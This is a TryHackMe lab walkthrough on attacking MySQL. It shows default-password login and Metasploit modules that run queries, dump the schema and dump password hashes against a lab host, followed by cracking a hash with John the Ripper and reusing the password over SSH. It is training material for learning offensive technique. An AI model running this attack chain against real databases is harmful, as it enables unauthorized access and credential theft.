# Enumerating MySQL

References:
- [TryHackMe: Network Services 2](https://tryhackme.com/r/room/networkservices2)
- [Blog: Enumerating and Exploiting MySQL](https://andickinson.github.io/blog/enumerating-and-exploiting-mysql/)

---

## 1. Access DB

### Install MySQL:
```bash
sudo apt install default-mysql-client
```

Try passwords:

'' (empty)

password

Great, now close the MySQL connection.

## 2. Exploitation

Open Metasploit:

```bash
msfconsole
```

Search for mysql_sql:
```bash
search mysql_sql
Use the auxiliary module:
use auxiliary/admin/mysql/mysql_sql
```

Set options:
```bash
set PASSWORD password
set RHOSTS 10.10.210.104
set USERNAME root
run
```

Result:
```bash
10.10.210.104:3306 - Sending statement: 'select version()'...
[*] 10.10.210.104:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
```


Show databases:
```bash
set SQL "show databases"
run
```

Result:
```bash
[*] 10.10.210.104:3306 - Sending statement: 'show databases'...
[*] 10.10.210.104:3306 -  | information_schema |
[*] 10.10.210.104:3306 -  | mysql |
[*] 10.10.210.104:3306 -  | performance_schema |
[*] 10.10.210.104:3306 -  | sys |
[*] Auxiliary module execution completed
```

Search for and select the mysql_schemadump:
```bash
search mysql_schemadump
```

Get the last table that gets dumped:
```bash
use auxiliary/scanner/mysql/mysql_schemadump
options
set PASSWORD password
set RHOSTS 10.10.210.104
set USERNAME root
run
```

Table Name:
```bash
TableName: x$waits_global_by_latency
```

Select the mysql_hashdump module:
```bash
search mysql_hashdump
use auxiliary/scanner/mysql/mysql_hashdump
```

Set the relevant options and run the exploit:
```bash
options
set PASSWORD password
set RHOSTS 10.10.210.104
set USERNAME root
run
```

Result:
```bash
[+] 10.10.210.104:3306 - Saving HashString as Loot: root:
[+] 10.10.210.104:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.210.104:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.210.104:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.210.104:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.210.104:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.210.104:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 3. Crack Password
```php
User: carl
```

Copy the hash string in full (e.g., bob:*HASH) to a text file on your local machine called hash.txt:
```bash
touch hash.txt
vi hash.txt
Ctrl+Shift+V
Shift+:
wq
```

Crack password:
```bash
john hash.txt
```

Result:
```bash
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
Proceeding with incremental:ASCII
doggie           (carl)
1g 0:00:00:02 DONE 3/3 (2024-11-14 09:45) 0.4545g/s 1039Kp/s 1039Kc/s 1039KC/s doggie..doggia
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


## 4. Access Shell

What are the chances that this user has reused their password for a different service?
```bash
ssh carl@10.10.210.104
Password: doggie
```

```bash
ls
cat MySQL.txt
```